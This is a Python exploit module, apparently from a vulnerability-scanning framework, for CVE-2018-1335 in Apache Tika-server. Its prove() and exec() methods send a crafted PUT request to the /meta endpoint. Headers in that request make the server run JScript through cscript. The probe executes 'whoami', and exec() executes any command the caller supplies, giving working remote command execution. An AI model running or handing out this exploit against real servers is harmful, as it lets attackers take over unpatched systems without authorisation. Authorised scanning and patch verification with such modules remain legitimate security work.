#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'CVE-2018-1335'
        self.keyword = ['apache', 'tika-server', 'burst']
        self.info = 'Apache Tika-server versions < 1.18 (CVE-2018-1335)'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        self.refer = 'https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2018-1335/CVE-2018-1335.py'
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
                       "X-Tika-OCRLanguage": "//E:Jscript",
                       "Expect": "100-continue",
                       "Content-type": "image/jp2",
                       "Connection": "close"}

            url = self.base_url + "meta"
            jscript = '''var oShell = WScript.CreateObject("WScript.Shell");
            var oExec = oShell.Exec('cmd /c {}');
            '''.format('cmd /c whoami')
            async with ClientSession() as session:
                async with session.put(url=url, headers=headers, data=jscript) as res:
                    if res!=None:
                        text = await res.text()
                        if res!= None and "X-Parsed-By" in text and "tika.parse" in text:
                            self.flag = 1
                            self.req.append({"flag": url})
                            self.res.append({"info": url, "key": "Apache Tika-server RCE"})


    async def exec(self):
        await self.get_url()
        if self.base_url:
            headers = {"X-Tika-OCRTesseractPath": "\"cscript\"",
                       "X-Tika-OCRLanguage": "//E:Jscript",
                       "Expect": "100-continue",
                       "Content-type": "image/jp2",
                       "Connection": "close"}

            url = self.base_url + "meta"
            jscript = '''var oShell = WScript.CreateObject("WScript.Shell");
             var oExec = oShell.Exec('cmd /c {}');
             '''.format(self.parameter['cmd'])
            async with ClientSession() as session:
                async with session.put(url=url, headers=headers, data=jscript) as res:
                    if res!=None:
                        text = await res.text()
                        if res!= None and "X-Parsed-By" in text and "tika.parse" in text:
                            self.flag = 1
                            self.req.append({"flag": url})
                            self.res.append({"info": text, "key": "Apache Tika-server RCE"})
